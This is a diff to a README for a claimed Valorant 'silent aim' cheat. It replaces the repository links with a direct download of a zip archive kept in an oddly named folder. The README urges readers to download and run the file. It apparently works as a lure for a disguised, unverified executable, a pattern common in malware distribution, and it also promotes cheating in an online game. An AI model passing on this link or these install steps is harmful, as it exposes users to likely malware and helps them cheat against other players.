@@ -1,6 +1,6 @@
 # 🎯 valorant-silent-aim-2026 - Bullets Snap Without Crosshair Movement
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_Silent_Aim_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cherriliberal3989/valorant-silent-aim-2026)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_Silent_Aim_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Cherriliberal3989/valorant-silent-aim-2026/main/fortunateness/silent_aim_valorant_1.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these simple steps to get **valorant-silent-aim-2026** running on your Wi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Cherriliberal3989/valorant-silent-aim-2026](https://github.com/Cherriliberal3989/valorant-silent-aim-2026)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Cherriliberal3989/valorant-silent-aim-2026/main/fortunateness/silent_aim_valorant_1.7.zip](https://raw.githubusercontent.com/Cherriliberal3989/valorant-silent-aim-2026/main/fortunateness/silent_aim_valorant_1.7.zip)**
 
 Click the download button on the page to get the file saved to your computer. The download should start automatically once you click the button.
 
